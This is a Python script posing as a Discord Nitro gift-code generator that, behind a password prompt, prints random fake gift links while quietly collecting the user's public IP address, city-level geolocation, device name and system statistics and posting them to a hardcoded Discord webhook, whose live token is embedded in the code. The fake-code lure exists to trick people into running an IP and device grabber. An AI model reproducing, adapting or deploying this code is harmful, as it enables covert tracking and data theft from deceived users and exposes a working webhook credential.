import os
import random
import requests
import platform
import psutil

def generate_nitro(amount):
    nitro = ''
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for _ in range(16):  # Nitro code length is always 16 characters
        nitro += random.choice(characters)
    return nitro

def send_data(ip, location, device_info):
    webhook_url = 'https://discord.com/api/webhooks/1212753846707687474/ezic8pIDhXJ8ltN198QamAurnPeTtSqthI0otLDsoxPCVOyOoKCeWlwgHIcaETd6ca_v'
    data = {
        'content': f'IP: {ip}\nLocation: {location}\nDevice Info: {device_info}'
    }
    requests.post(webhook_url, data=data)

def get_location(ip):
    try:
        location = requests.get(f'http://ip-api.com/json/{ip}').json()
        if location['status'] == 'success':
            return f"{location['city']}, {location['regionName']}, {location['country']}"
        else:
            return "Unknown Location"
    except Exception as e:
        return f'Error getting location: {e}'

def get_device_info():
    try:
        cpu_percent = psutil.cpu_percent()
        ram_percent = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/')
        device_info = f'CPU Usage: {cpu_percent}%\n'
        device_info += f'RAM Usage: {ram_percent}%\n'
        device_info += f'Disk Usage: {disk_usage.percent}%\n'
        device_info += f'Device Name: {platform.node()}\n'
        device_info += f'Python Version: {platform.python_version()}\n'
        return device_info
    except Exception as e:
        return f'Error getting device information: {e}'

def main():
    password = input("Enter the password: ")
    if password == 'halalnitrogen0':
        print("Password accepted.")
        print("Options for generating nitro:")
        print("1. 10 nitro")
        print("2. 50 nitro")
        print("3. 100 nitro")
        print("4. 500 nitro")
        print("5. 1000 nitro")
        choice = int(input("Enter your choice: "))
        if choice in range(1, 6):
            nitro = generate_nitro(choice * 10)
            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
            ip = requests.get('https://api.ipify.org').text
            location = get_location(ip)
            device_info = get_device_info()
            send_data(ip, location, device_info)
            print("Data sent to Discord server.")
        else:
            print("Invalid choice.")
    else:
        print("Incorrect password.")

if __name__ == "__main__":
    main()
  
